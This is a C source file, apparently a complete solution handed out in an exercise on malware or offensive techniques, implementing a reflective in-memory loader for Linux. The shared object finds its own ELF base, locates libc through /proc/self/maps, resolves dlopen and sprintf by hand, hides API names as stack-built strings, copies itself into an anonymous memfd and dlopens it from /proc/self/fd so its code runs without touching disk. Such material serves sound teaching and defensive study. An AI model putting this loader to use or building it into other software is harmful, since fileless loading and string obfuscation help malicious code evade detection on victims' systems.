/*
 * Exercise 4 — Reflective memfd loader (complete, given to students)
 *
 * This is compiled as a -nostdlib -fPIC shared object.  A bootstrap
 * stub branches into load_memfd() with the SO size in x0.
 *
 * Flow: find own base → find libc → resolve dlopen/sprintf →
 *       create memfd → write self → dlopen(/proc/self/fd/N) →
 *       constructor fires.
 */
#define _GNU_SOURCE
#include "ex3_procfsutil_solution.h"
#include "ex3_elfsym_solution.h"
#include "syscall.h"
#include "minstr.h"

#include <dlfcn.h>
#include <elf.h>
#include <fcntl.h>
#include <stdint.h>
#include <sys/mman.h>

/* Stack string macros */
#define STACK_STR_DLOPEN(var)                                                 \
  char var[7];                                                                \
  var[0]='d'; var[1]='l'; var[2]='o'; var[3]='p';                            \
  var[4]='e'; var[5]='n'; var[6]='\0';

#define STACK_STR_SPRINTF(var)                                                \
  char var[8];                                                                \
  var[0]='s'; var[1]='p'; var[2]='r'; var[3]='i';                            \
  var[4]='n'; var[5]='t'; var[6]='f'; var[7]='\0';

#define STACK_STR_LIBCSO(var)                                                 \
  char var[8];                                                                \
  var[0]='l'; var[1]='i'; var[2]='b'; var[3]='c';                            \
  var[4]='.'; var[5]='s'; var[6]='o'; var[7]='\0';

#define STACK_STR_RXP(var)                                                    \
  char var[5];                                                                \
  var[0]='r'; var[1]='-'; var[2]='x'; var[3]='p'; var[4]='\0';

#define STACK_STR_PROC_FD(var)                                                \
  char var[17];                                                               \
  var[0]='/';  var[1]='p';  var[2]='r';  var[3]='o';                         \
  var[4]='c';  var[5]='/';  var[6]='s';  var[7]='e';                         \
  var[8]='l';  var[9]='f';  var[10]='/'; var[11]='f';                        \
  var[12]='d'; var[13]='/'; var[14]='%'; var[15]='d';                        \
  var[16]='\0';

typedef void *(*dlopen_func_t)(const char *, int);
typedef int   (*sprintf_func_t)(char *, const char *, ...);

void dummy(void);

static void msg(const char *s)
{
    sys_write(2, s, strlen(s));
}

/* Find our own ELF base by scanning backwards from a known address */
static uint8_t *find_base(void)
{
    uintptr_t search = ((uintptr_t)&find_base) & ~((uintptr_t)0xFFF);
    for (int page = 0; page < 4; page++) {
        uint8_t *c = (uint8_t *)(search - page * 0x1000);
        if (c[0] == 0x7F && c[1] == 'E' && c[2] == 'L' && c[3] == 'F')
            return c;
    }
    return NULL;
}

/* Entry point — called by bootstrap stub with SO file size in x0 */
void *load_memfd(size_t span)
{
    msg("[bootstrap] reflective loader started\n");

    uint8_t *base = find_base();
    if (!base) { msg("[-] cannot find own ELF base\n"); return NULL; }

    msg("[bootstrap] found ELF base\n");

    /* Create anonymous file */
    char name[2] = {'x', '\0'};
    int mem_fd = sys_memfd_create(name, MFD_CLOEXEC);
    if (mem_fd < 0) { msg("[-] memfd_create failed\n"); return NULL; }

    /* Resolve libc symbols */
    uintptr_t libc_base = 0;
    STACK_STR_LIBCSO(libc_str);
    STACK_STR_RXP(perm);
    if (search_lib_procmaps(libc_str, perm, &libc_base) != 0) {
        msg("[-] libc not found\n");
        return NULL;
    }

    msg("[bootstrap] found libc\n");

    STACK_STR_DLOPEN(str_dlopen);
    STACK_STR_SPRINTF(str_sprintf);
    dlopen_func_t g_dlopen =
        (dlopen_func_t)find_symbol_symtab((void *)libc_base, str_dlopen);
    sprintf_func_t g_sprintf =
        (sprintf_func_t)find_symbol_symtab((void *)libc_base, str_sprintf);

    if (!g_dlopen)  { msg("[-] dlopen not resolved\n"); return NULL; }
    if (!g_sprintf) { msg("[-] sprintf not resolved\n"); return NULL; }

    /* Build /proc/self/fd/<N> path */
    char proc_path[64];
    STACK_STR_PROC_FD(fd_fmt);
    g_sprintf(proc_path, fd_fmt, mem_fd);

    msg("[bootstrap] loading via ");
    msg(proc_path);
    msg("\n");

    /* Write our SO bytes to memfd and dlopen */
    sys_write(mem_fd, base, span);
    g_dlopen(proc_path, RTLD_NOW);

    msg("[bootstrap] done\n");
    return NULL;
}

void dummy(void) {}
